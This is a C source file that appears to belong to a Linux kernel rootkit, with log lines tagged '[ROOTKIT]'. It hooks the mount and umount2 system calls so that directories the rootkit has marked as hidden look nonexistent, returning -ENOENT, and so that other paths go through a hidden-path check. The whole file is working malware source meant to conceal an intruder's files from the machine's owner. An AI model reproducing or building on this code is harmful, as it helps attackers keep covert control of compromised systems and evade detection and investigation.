#include "files.h"
#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_mount syscall hook handler
SYSCALL_HOOK_HANDLER5(mount, orig_mount, p_regs, char __user *, s_dev_name, char __user *,
                      s_dir_name, char __user *, s_type, unsigned long, ui32_flags, void __user *,
                      p_data)
{
    pr_info("[ROOTKIT] mount(%p, %p, %p, %lu, %p)\n", s_dev_name, s_dir_name, s_type, ui32_flags,
            p_data);

    // Check if the target directory is hidden
    if (is_pathname_hidden(AT_FDCWD, s_dir_name, LOOKUP_FOLLOW)) {
        return -ENOENT;
    }

    return do_check_hidden(orig_mount, p_regs, AT_FDCWD, s_dev_name, 0);
}

// sys_umount2 syscall hook handler
SYSCALL_HOOK_HANDLER2(umount2, orig_umount2, p_regs, char __user *, s_name, int, i32_flags)
{
    pr_info("[ROOTKIT] umount2(%p, %d)\n", s_name, i32_flags);

    if (i32_flags & ~(MNT_FORCE | MNT_DETACH | MNT_EXPIRE | UMOUNT_NOFOLLOW)) {
        return -EINVAL;
    }

    return do_check_hidden(orig_umount2, p_regs, AT_FDCWD, s_name,
                           i32_flags & UMOUNT_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}
